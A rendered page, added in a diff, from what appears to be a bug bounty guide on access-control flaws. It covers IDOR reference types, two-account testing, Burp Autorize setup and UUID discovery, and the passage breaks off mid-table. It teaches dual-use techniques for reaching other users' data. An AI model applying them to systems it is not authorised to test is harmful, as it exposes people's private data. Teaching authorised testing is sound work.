+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#322-chaining-idors-into-account-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.2.2 Chaining IDORs into Account Takeover
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#33-vertical-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.3 Vertical Privilege Escalation
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.3 Vertical Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#331-role-parameter-tampering" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.3.1 Role Parameter Tampering
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#332-admin-endpoint-access-as-regular-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.3.2 Admin Endpoint Access as Regular User
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#333-forced-browsing-and-state-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.3.3 Forced Browsing and State Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#34-indirect-object-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.4 Indirect Object References
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.4 Indirect Object References">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#341-email-and-username-as-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.4.1 Email and Username as References
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#342-filename-as-reference-path-traversal-variant" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.4.2 Filename as Reference (Path Traversal Variant)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#35-idor-impact-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.5 IDOR Impact Escalation
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3.5 IDOR Impact Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#351-severity-framework" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.5.1 Severity Framework
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#352-writing-the-idor-report" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        3.5.2 Writing the IDOR Report
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-3-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 3 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="access-control">Access Control<a class="headerlink" href="#access-control" title="Permanent link">&para;</a></h1>
+<p>Access control is the single most common high-severity vulnerability class in bug bounty. IDOR alone accounts for a disproportionate share of Critical and High payouts. The reason it stays so common: it cannot be found by a scanner. It requires a human who understands what the application is supposed to restrict, and then tests whether it actually does.</p>
+<p>Every object the application manages is a potential IDOR. Every role boundary is a potential privilege escalation.</p>
+<hr />
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 7v2H9v6h1v2H6v-2h1V9H6V7zm6 0a2 2 0 0 1 2 2v6c0 1.11-.89 2-2 2h-4V7m4 2h-2v6h2z"/></svg></span> <strong>3.1 IDOR Fundamentals</strong></p>
+<hr />
+<p>Reference types, where they live, the two-account methodology, UUID misconceptions.</p>
+<p><a href="#31-idor-fundamentals"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Start here</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 22v-2h3v-3h2v3.5c0 .39-.16.74-.46 1.04s-.65.46-1.04.46zM7 22H3.5c-.39 0-.74-.16-1.04-.46S2 20.89 2 20.5V17h2v3h3zM17 2h3.5c.39 0 .74.16 1.04.46s.46.65.46 1.04V7h-2V4h-3zM7 2v2H4v3H2V3.5c0-.39.16-.74.46-1.04S3.11 2 3.5 2zm3.5 4C13 6 15 8 15 10.5c0 .88-.25 1.7-.69 2.4l3.26 3.26-1.41 1.41-3.26-3.26c-.7.44-1.52.69-2.4.69C8 15 6 13 6 10.5S8 6 10.5 6m0 2a2.5 2.5 0 0 0 0 5 2.5 2.5 0 0 0 0-5"/></svg></span> <strong>3.2 Finding IDORs at Scale</strong></p>
+<hr />
+<p>Autorize setup, manual flow mapping, chaining reads into ATO.</p>
+<p><a href="#32-finding-idors-at-scale"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Scale</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15 20H9v-8H4.16L12 4.16 19.84 12H15z"/></svg></span> <strong>3.3 Vertical Privilege Escalation</strong></p>
+<hr />
+<p>Role tampering, admin endpoint access, forced browsing, state bypass.</p>
+<p><a href="#33-vertical-privilege-escalation"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Privesc</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10.59 13.41c.41.39.41 1.03 0 1.42-.39.39-1.03.39-1.42 0a5.003 5.003 0 0 1 0-7.07l3.54-3.54a5.003 5.003 0 0 1 7.07 0 5.003 5.003 0 0 1 0 7.07l-1.49 1.49c.01-.82-.12-1.64-.4-2.42l.47-.48a2.98 2.98 0 0 0 0-4.24 2.98 2.98 0 0 0-4.24 0l-3.53 3.53a2.98 2.98 0 0 0 0 4.24m2.82-4.24c.39-.39 1.03-.39 1.42 0a5.003 5.003 0 0 1 0 7.07l-3.54 3.54a5.003 5.003 0 0 1-7.07 0 5.003 5.003 0 0 1 0-7.07l1.49-1.49c-.01.82.12 1.64.4 2.43l-.47.47a2.98 2.98 0 0 0 0 4.24 2.98 2.98 0 0 0 4.24 0l3.53-3.53a2.98 2.98 0 0 0 0-4.24.973.973 0 0 1 0-1.42"/></svg></span> <strong>3.4 Indirect Object References</strong></p>
+<hr />
+<p>Email and username as references, filename traversal as IDOR variant.</p>
+<p><a href="#34-indirect-object-references"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Indirect</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m23 12-2.44-2.78.34-3.68-3.61-.82-1.89-3.18L12 3 8.6 1.54 6.71 4.72l-3.61.81.34 3.68L1 12l2.44 2.78-.34 3.69 3.61.82 1.89 3.18L12 21l3.4 1.46 1.89-3.18 3.61-.82-.34-3.68zm-10 5h-2v-2h2zm0-4h-2V7h2z"/></svg></span> <strong>3.5 Impact Escalation</strong></p>
+<hr />
+<p>Severity framework, mass IDOR, writing reports that get paid.</p>
+<p><a href="#35-idor-impact-escalation"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Impact</a></p>
+</li>
+</ul>
+</div>
+<hr />
+<h2 id="decision-flow">Decision Flow<a class="headerlink" href="#decision-flow" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>App has user-owned objects (invoices, files, messages, profiles)?
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>→ IDOR first. Set up two accounts before anything else.
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>App has multiple user roles (free/paid, user/admin, member/owner)?
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>→ Vertical privesc. Test role parameter tampering + admin endpoint access.
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Found numeric IDs in URLs or request bodies?
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>→ Increment/decrement. Test from second account session.
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Found UUIDs or hashed IDs?
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>→ Don&#39;t assume they&#39;re safe. Find them in other API responses first. (3.1.4)
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>Found a multi-step flow (checkout, onboarding, verification)?
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>→ Test whether steps can be skipped entirely. (3.3.3)
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>Time-constrained?
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>→ Autorize running + browse full app as two accounts → triage flags manually
+</span></code></pre></div>
+<hr />
+<h2 id="31-idor-fundamentals">3.1 IDOR Fundamentals<a class="headerlink" href="#31-idor-fundamentals" title="Permanent link">&para;</a></h2>
+<p><strong>What IDOR is:</strong> Insecure Direct Object Reference — when an application exposes a reference to an internal object (database record, file, user account) and doesn't verify that the requesting user is authorized to access that specific object.</p>
+<p>The attacker changes the reference. The server returns someone else's data.</p>
+<h3 id="311-object-reference-types">3.1.1 Object Reference Types<a class="headerlink" href="#311-object-reference-types" title="Permanent link">&para;</a></h3>
+<p>Not all references look like integers. Know every form they take:</p>
+<table>
+<thead>
+<tr>
+<th>Reference Type</th>
+<th>Example</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Numeric ID</td>
+<td><code>/api/invoice/1042</code></td>
+<td>Most obvious, still common</td>
+</tr>
+<tr>
+<td>UUID/GUID</td>
+<td><code>/api/doc/550e8400-e29b-41d4-a716</code></td>
+<td>Not a security control — see 3.1.4</td>
+</tr>
+<tr>
+<td>Hash (MD5/SHA1)</td>
+<td><code>/files/5f4dcc3b5aa765d61d8327deb</code></td>
+<td>Not a security control — see 3.1.4</td>
+</tr>
+<tr>
+<td>Username</td>
+<td><code>/profile/john.doe</code></td>
+<td>Swap username in URL</td>
+</tr>
+<tr>
+<td>Email</td>
+<td><code>/api/user?email=victim@x.com</code></td>
+<td>Direct enumeration</td>
+</tr>
+<tr>
+<td>Filename</td>
+<td><code>/download?file=report_1042.pdf</code></td>
+<td>Path traversal also possible</td>
+</tr>
+<tr>
+<td>Encoded value</td>
+<td><code>/api/obj/dXNlcl8xMDQy</code></td>
+<td>Base64 — decode first</td>
+</tr>
+<tr>
+<td>Indirect slug</td>
+<td><code>/api/invoice/march-2026</code></td>
+<td>Predictable from pattern</td>
+</tr>
+</tbody>
+</table>
+<div class="language-bash highlight"><span class="filename">decode_references.sh</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Base64 — often just an encoded integer</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;dXNlcl8xMDQy&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1"># user_1042 → numeric ID was just encoded</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># URL encoded</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import urllib.parse; print(urllib.parse.unquote(&#39;user%5F1042&#39;))&quot;</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="c1"># JWT payload (frequently contains object references)</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;payload_part&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span></code></pre></div>
+<hr />
+<h3 id="312-where-idors-live">3.1.2 Where IDORs Live<a class="headerlink" href="#312-where-idors-live" title="Permanent link">&para;</a></h3>
+<p>The key question for every parameter: <em>Does changing this value to another user's equivalent give me access to their data or actions?</em></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>URL path parameters:
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>  GET /api/users/1042/profile
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>  GET /documents/download/5523
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>  GET /invoices/march-2026/export
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Query string parameters:
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>  GET /dashboard?user_id=1042
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>  GET /report?account=5523&amp;format=pdf
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>  GET /notifications?recipient=john.doe
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>Request body (POST/PUT/PATCH):
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>  {&quot;user_id&quot;: 1042, &quot;action&quot;: &quot;delete&quot;}
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>  {&quot;document_id&quot;: &quot;550e8400...&quot;, &quot;share&quot;: true}
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>  {&quot;account_number&quot;: &quot;5523&quot;, &quot;amount&quot;: 100}
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>HTTP headers:
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>  X-User-ID: 1042
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>  X-Account-ID: 5523
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>  X-Org-ID: 99
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>Cookies:
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>  user_id=1042
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>  account=5523
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>Indirect — referenced in response, sent back in next request:
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>  Step 1: GET /cart → response contains {&quot;cart_id&quot;: &quot;abc123&quot;}
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>  Step 2: POST /checkout {&quot;cart_id&quot;: &quot;abc123&quot;} ← swap this
+</span></code></pre></div>
+<hr />
+<h3 id="313-the-two-account-testing-methodology">3.1.3 The Two-Account Testing Methodology<a class="headerlink" href="#313-the-two-account-testing-methodology" title="Permanent link">&para;</a></h3>
+<p><strong>This is the correct way to test IDOR. Always use two accounts.</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Account A — attacker (you control this)
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Account B — victim  (you also control this — second test account)
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Setup:
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>1. Log in as Account B, create objects: upload a file, create a document,
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>   place an order, send a message. Note all object IDs.
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>2. Log in as Account A.
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>3. Attempt to access Account B&#39;s objects using Account A&#39;s session.
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>4. Account A can access Account B&#39;s data → IDOR confirmed.
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>Why two accounts:
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>- You always have a valid ID to test with (Account B&#39;s real IDs)
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>- You can confirm exactly what data was accessed
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>- You can demonstrate impact clearly in the report
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>- No risk of accidentally accessing real user data
+</span></code></pre></div>
+<p><strong>Autorize workflow in Burp:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>1. Install Autorize (BApp Store)
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>2. Log in as Account A (low privilege) → copy session cookie to Autorize
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>3. Log in as Account B (same or higher privilege)
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>4. Browse the app as Account B — Autorize replays every request
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>   automatically using Account A&#39;s session
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>5. Autorize flags requests where Account A gets a 200 with similar
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>   response body to Account B → IDOR candidate
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>6. Manually verify every flag
+</span></code></pre></div>
+<p><strong>Autorize result states:</strong></p>
+<table>
+<thead>
+<tr>
+<th>State</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Bypassed!</code></td>
+<td>Same response body — verify manually</td>
+</tr>
+<tr>
+<td><code>Enforced!</code></td>
+<td>Different response (smaller body, 403) — not vulnerable</td>
+</tr>
+<tr>
+<td><code>Is enforced???</code></td>
+<td>Ambiguous — review manually</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">Autorize configuration</p>
+<p>Set "Ignore headers" for: <code>Cookie</code>, <code>Authorization</code>, <code>X-CSRF-Token</code> — so only those get swapped. Add a "Filtered strings" pattern for your own Account A data so it doesn't false-positive on your own objects.</p>
+</div>
+<hr />
+<h3 id="314-uuid-and-hash-based-idor">3.1.4 UUID and Hash-Based IDOR<a class="headerlink" href="#314-uuid-and-hash-based-idor" title="Permanent link">&para;</a></h3>
+<p><strong>The misconception:</strong> Many developers believe UUIDs and hashed IDs are security controls. They are not. They are obscurity. If the UUID or hash is discoverable through any other means, the IDOR is fully exploitable.</p>
+<p><strong>How to find other users' UUIDs:</strong></p>
+<div class="language-bash highlight"><span class="filename">uuid_discovery.sh</span><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># 1. API responses that list other users&#39; UUIDs</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># GET /api/org/members → [{user_id: &quot;550e8400...&quot;, name: &quot;Alice&quot;}, ...]</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># Now test: GET /api/users/550e8400.../private-data</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># 2. Error messages that reveal IDs</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># &quot;Access denied to document 550e8400-e29b-41d4-a716&quot;</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># → UUID is now known — test from another account</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c1"># 3. UUID v1 is time-based and sequential — predictable</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c1"># Check: if IDs look like 550e8400-e29b-11e?-... → UUIDv1</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c1"># 4. Hash-based IDs from predictable input</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="c1"># /files/5f4dcc3b5aa765d61d8327deb882cf99</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="c1"># → MD5 of &quot;password&quot;? Test:</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;report_2026.pdf&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>md5sum
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="c1"># 5. Grep all Burp responses for UUIDs</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s2">&quot;[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">  </span>burp_responses/<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+</span></code></pre></div>
+<hr />
+<h2 id="32-finding-idors-at-scale">3.2 Finding IDORs at Scale<a class="headerlink" href="#32-finding-idors-at-scale" title="Permanent link">&para;</a></h2>
+<h3 id="321-manual-flow-mapping">3.2.1 Manual Flow Mapping<a class="headerlink" href="#321-manual-flow-mapping" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> After Autorize. Autorize catches horizontal IDORs but misses vertical escalation, state-based access, and indirect IDORs that span multiple steps.</p>
+<p>Build this table for every application feature you test:</p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Object</th>
+<th>Reference Location</th>
+<th>Tested</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>View invoice</td>
+<td><code>invoice_id</code></td>
+<td><code>GET /api/invoice/ID</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td>Delete document</td>
+<td><code>doc_id</code></td>
+<td>POST body</td>
+<td>✓</td>
+</tr>
+<tr>
